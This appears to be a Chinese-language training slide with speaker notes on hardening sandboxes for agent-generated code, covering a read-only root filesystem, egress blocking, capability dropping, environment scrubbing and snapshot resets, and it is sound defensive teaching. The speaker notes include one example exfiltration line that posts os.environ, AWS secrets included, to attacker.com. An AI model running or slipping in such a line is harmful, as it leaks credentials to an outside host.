解构 Agent 物理执行沙箱的安全加固规则：通过 只读根文件系统 (Read-Only Root FS)、出站网络封锁 (Egress Network Isolation) 与 Copy-on-Write 极速临时快照 (CoW Ephemeral Snapshots)，防范信息泄露、恶意外联与脏状态残留

1. 三重沙箱安全硬化防护机制

3 Sandbox Hardening Principles

Hardening Pillars
Read-Only FS
只读根文件系统挂载： 根目录全盘只读挂载 (`read_only=True`)；仅允许在临时内存盘 (`/tmp` tmpfs) 进行短暂代码编译。
Egress Block
严苛出站网络隔离 (Egress Isolation)： 默认封锁全网出站流量（`network_mode="none"`），切断黑客 C2 反向外联与宿主机 AK/SK 外泄风险。
CoW Snapshots
Copy-on-Write 极速快照重置： 基于 CoW 机制实现毫秒级磁盘重置；代码运行完毕后瞬间抹除写层，还原至纯净基线。
物理本质：建立在零信任假设下的绝对代码隔离与内存盘防线

2. 沙箱安全加固与网络隔离配置代码

Hardened MicroVM / Docker Sandbox Configuration

Hardening Config
# 生产级代码执行沙箱安全硬化配置 (Python / Docker SDK)
sandbox_config = {
"read_only": True, # 1. 根文件系统绝对只读
"network_mode": "none", # 2. 物理斩断出站网络外联
"tmpfs": {"/tmp": "rw,noexec,size=64m"}, # 3. 仅分配 64M 临时内存盘
"cap_drop": ["ALL"], # 4. 放弃所有 Linux Kernel 特权
"mem_limit": "256m", # 5. 内存配额防止资源炸弹
"environment": sanitize_env(os.environ) # 6. 剔除 AWS_KEY/Secrets
}

# 执行并在退出时以 CoW 快照瞬间 Rollback
with
SpawnHardenedSandbox(sandbox_config) as sbx:
result = sbx.run_untrusted_code(generated_code)
  • 环境变量彻底清洗：前置剔除 `AWS_SECRET_ACCESS_KEY` 等敏感秘钥，杜绝不可信代码反向读取。
  • Linux Capability 剥夺：`cap_drop=["ALL"]` 封堵物理容器提权与内核逃逸入口。
物理本质：把不可信代码封印在零特权、零网络、零持久化的三零极简容器中

Architectural Core Thesis / 架构师视角

沙箱防护不仅要防“坏代码破坏系统”，更要防“坏代码窃取凭证并反向外联”！通过只读根文件系统挂载、断绝出站网络外联（network_mode="none"）与环境变量防泄露清洗，能够确保即使 LLM 产生恶意指令，也绝无可能对企业的数字资产造成实质威胁。

Speaker Notes / 讲师讲稿
🎯 剖析沙箱安全加固的核心风险点： “向学员深入剖析：当我们有了 E2B 或 Firecracker 沙箱后，绝不意味着就万事大吉了。如果沙箱内部继承了宿主机的环境变量（比如包含了 AWS_SECRET_ACCESS_KEY），生成的代码可能包含恶意逻辑：`requests.post('http://attacker.com', data=os.environ)`。这就造成了严重的信息泄漏。”
💡 强调出站网络隔离与零特权加固： “提示学员看右侧配置代码：在真实的生产加固中，我们采用三重硬化策略——1. 根目录只读挂载；2. 默认禁止出站网络 (`network_mode="none"`)；3. 剥夺所有 Linux Capability (`cap_drop=["ALL"]`)，前置清洗环境变量。做到这几点，才能确保代码跑在真正的安全死角中。”
